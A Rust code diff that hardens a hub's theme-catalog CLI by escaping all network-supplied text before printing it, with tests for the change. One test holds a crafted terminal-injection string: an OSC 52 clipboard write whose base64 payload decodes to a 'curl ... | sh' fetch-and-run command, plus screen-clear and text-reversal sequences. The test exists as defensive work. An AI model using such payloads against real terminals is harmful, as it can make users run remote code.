@@ -5,12 +5,15 @@
 //! The theme rules are the terminal client's reader (`agora_tui::theme::file::read_text`), which accepts and refuses a file exactly as
 //! the web window does. It is given to the hub from here, the one crate that already links both, so the hub crate does not depend on a
 //! client crate and no crate is added or split for it.
+//!
+//! Everything printed that came from the network (ids, field names, a theme's problems, the saved address) goes through
+//! [`printable`] first, so a catalog cannot send the owner's terminal escape sequences (#1225 review F2).
 
 use std::process::ExitCode;
 
 use agora_hub::server;
 use agora_hub::store::SqliteStore;
-use agora_hub::theme_catalog::{self, IndexError, Limits, Refusal, UpdateError};
+use agora_hub::theme_catalog::{self, printable, IndexError, Limits, Refusal, UpdateError};
 use agora_i18n::{key, Arg};
 use agora_tui::theme::file::{read_text, Problem, Read};
 
@@ -86,7 +89,7 @@ fn say_status(say: &Say, store: &SqliteStore) -> ExitCode {
             &[
                 ("count", (s.themes as i64).into()),
                 ("when", utc(s.updated_ms).into()),
-                ("url", s.url.into()),
+                ("url", printable(&s.url).into()),
             ],
         );
     }
@@ -117,21 +120,8 @@ pub(crate) fn run_update(say: &Say, store: &SqliteStore, url: &str, limits: Limi
     match theme_catalog::update(store, url, limits, check, server::now_ms()) {
         Ok(f) => {
             for (id, r) in &f.refused {
-                say.err(
-                    key!("cli-hub-themes-refused"),
-                    &[
-                        ("id", id.clone().into()),
-                        ("reason", refusal_text(say, r).into()),
-                    ],
-                );
-                if let Refusal::Theme(problems) = r {
-                    let t = |id: &str, args: &[(&str, Arg)]| say.text(id, args);
-                    for p in problems {
-                        say.err(
-                            key!("cli-hub-themes-problem"),
-                            &[("text", agora_tui::theme::list::issue_text(p, &t).into())],
-                        );
-                    }
+                for line in refusal_lines(say, id, r) {
+                    eprintln!("{line}");
                 }
             }
             say.out(
@@ -156,16 +146,41 @@ pub(crate) fn run_update(say: &Say, store: &SqliteStore, url: &str, limits: Limi
                 UpdateError::Theme { id, error } => say.text(
                     key!("cli-hub-themes-theme-unreachable"),
                     &[
-                        ("id", id.clone().into()),
+                        ("id", printable(id).into()),
                         ("reason", index_text(say, error).into()),
                     ],
                 ),
-                UpdateError::Store(s) => s.clone(),
+                UpdateError::Store(s) => printable(s),
             };
             say.err(key!("cli-hub-themes-failed"), &[("reason", reason.into())]);
             ExitCode::from(1)
         }
     }
+}
+
+/// What is printed for one refused theme: the refusal, then each reason the theme rules give. Every piece from the network is made
+/// [`printable`].
+fn refusal_lines(say: &Say, id: &str, r: &Refusal<Vec<Problem>>) -> Vec<String> {
+    let mut lines = vec![say.text(
+        key!("cli-hub-themes-refused"),
+        &[
+            ("id", printable(id).into()),
+            ("reason", refusal_text(say, r).into()),
+        ],
+    )];
+    if let Refusal::Theme(problems) = r {
+        let t = |id: &str, args: &[(&str, Arg)]| say.text(id, args);
+        for p in problems {
+            lines.push(say.text(
+                key!("cli-hub-themes-problem"),
+                &[(
+                    "text",
+                    printable(&agora_tui::theme::list::issue_text(p, &t)).into(),
+                )],
+            ));
+        }
+    }
+    lines
 }
 
 fn kib(n: usize) -> Arg {
@@ -190,7 +205,7 @@ fn index_text(say: &Say, e: &IndexError) -> String {
         IndexError::Newer => say.text(key!("cli-hub-themes-index-newer"), &[]),
         IndexError::UnknownField(f) => say.text(
             key!("cli-hub-themes-index-unknown-field"),
-            &[("field", f.clone().into())],
+            &[("field", printable(f).into())],
         ),
         IndexError::TooMany => say.text(
             key!("cli-hub-themes-index-too-many"),
@@ -207,7 +222,7 @@ fn refusal_text<P>(say: &Say, r: &Refusal<P>) -> String {
         ),
         Refusal::UnknownField(f) => say.text(
             key!("cli-hub-themes-refused-unknown-field"),
-            &[("field", f.clone().into())],
+            &[("field", printable(f).into())],
         ),
         Refusal::Duplicate => say.text(key!("cli-hub-themes-refused-duplicate"), &[]),
         Refusal::Status(s) => say.text(
@@ -632,6 +647,90 @@ mod tests {
             ]
         );
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// #1225 review F2: field names from an untrusted index or theme (a clipboard write by OSC 52, a cleared screen, text turned
+    /// around) reach the owner's terminal only as visible escapes.
+    #[test]
+    fn nothing_from_the_catalog_reaches_the_terminal_as_an_escape_sequence() {
+        let evil = "\u{1b}]52;c;Y3VybCBlLmNvfHNoCg==\u{7}\u{1b}[2J\u{202e}x\nFAKE";
+        let bad = |s: &str| {
+            s.chars()
+                .any(|c| c.is_control() || agora_core::text::is_hidden(c))
+        };
+        let mut e = entry("a", 1, NIGHT);
+        e[evil] = 1.into();
+        let (_, refused) = theme_catalog::read_index::<Vec<Problem>>(&index(vec![e])).unwrap();
+        let theme = format!(
+            r#"{{"agora-theme": 1, "name": "X", "scheme": "dark", "tokens": {{}}, {}: 1}}"#,
+            serde_json::Value::from(evil)
+        );
+        let problems = check(&theme).unwrap_err();
+        let mut top = serde_json::json!({"agora-theme-catalog": 1, "themes": []});
+        top[evil] = 1.into();
+        let top_err = theme_catalog::read_index::<()>(&top.to_string())
+            .map(|_| ())
+            .unwrap_err();
+        for say in [Say(Catalog::english()), Say(Catalog::turkish())] {
+            let mut printed = refusal_lines(&say, &refused[0].0, &refused[0].1);
+            printed.extend(refusal_lines(&say, evil, &Refusal::Theme(problems.clone())));
+            printed.push(index_text(&say, &top_err));
+            printed.push(index_text(&say, &IndexError::UnknownField(evil.into())));
+            assert!(printed.len() >= 5);
+            for line in &printed {
+                assert!(!bad(line), "{line:?}");
+            }
+            assert!(
+                printed.iter().any(|l| l.contains(r"\u{1b}]52;c;")),
+                "{printed:?}"
+            );
+        }
+    }
+
+    /// #1225 review F3: a theme file whose server is busy or failing stops the update with nothing changed, not the theme dropped.
+    #[test]
+    fn a_busy_or_failing_server_changes_nothing() {
+        let idx = index(vec![entry("night", 2, NIGHT)]);
+        let mut a = HashMap::new();
+        a.insert("/good/index.json".to_string(), ok(&idx));
+        a.insert("/good/themes/night.json".to_string(), ok(NIGHT));
+        for (dir, status) in [("busy", 429u16), ("down", 503)] {
+            a.insert(
+                format!("/{dir}/index.json"),
+                ok(&index(vec![entry("night", 3, NIGHT)])),
+            );
+            a.insert(
+                format!("/{dir}/themes/night.json"),
+                Answer::Body(status, String::new(), Vec::new()),
+            );
+        }
+        let (base, _) = serve(a);
+        let store = SqliteStore::open_in_memory().unwrap();
+        theme_catalog::update(
+            &store,
+            &format!("{base}/good/index.json"),
+            roomy(),
+            check,
+            1,
+        )
+        .unwrap();
+        for (dir, status) in [("busy", 429u16), ("down", 503)] {
+            assert_eq!(
+                theme_catalog::update(
+                    &store,
+                    &format!("{base}/{dir}/index.json"),
+                    roomy(),
+                    check,
+                    2
+                )
+                .unwrap_err(),
+                UpdateError::Theme {
+                    id: "night".into(),
+                    error: IndexError::Status(status)
+                }
+            );
+            assert_eq!(ids(&store), [("night".to_string(), 2)], "{dir}");
+        }
     }
 
     #[test]
